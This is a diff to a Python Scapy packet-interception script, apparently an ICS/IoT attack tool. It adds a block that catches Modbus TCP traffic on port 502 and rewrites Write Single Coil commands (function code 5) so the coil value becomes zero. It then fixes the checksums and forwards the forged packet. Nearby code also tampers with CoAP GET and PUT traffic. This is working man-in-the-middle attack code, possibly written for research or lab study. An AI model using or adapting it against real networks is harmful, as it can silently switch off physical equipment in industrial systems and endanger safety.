@@ -97,6 +97,19 @@ def modify(packet):
                 packet.set_payload(bytes(pkt))
                 print("Paquete Enviado Modificado")
                 print(str(packet))
+    #Modbus Manipulation Writer
+    if pkt.haslayer(TCP) and pkt.getlayer(TCP).dport== 502:
+        print(pkt[TCP].show())
+        if pkt.haslayer(Raw):
+            load = pkt[TCP][Raw].load
+            if load[7] == 5:
+                load = bytes(load[:10]) + b'\x00\x00'
+            pkt[TCP][Raw].load = load
+            del pkt[IP].chksum
+            del pkt[TCP].chksum
+            packet.set_payload(bytes(pkt))
+            print("Se ha enviado el paquete modficado")
+            print(str(packet))
     #COAP Packet Manipulation of Get and Put Methods
     if pkt.haslayer(UDP) and pkt.getlayer(UDP).dport == 5683:
         orig_load = pkt[UDP][Raw].load
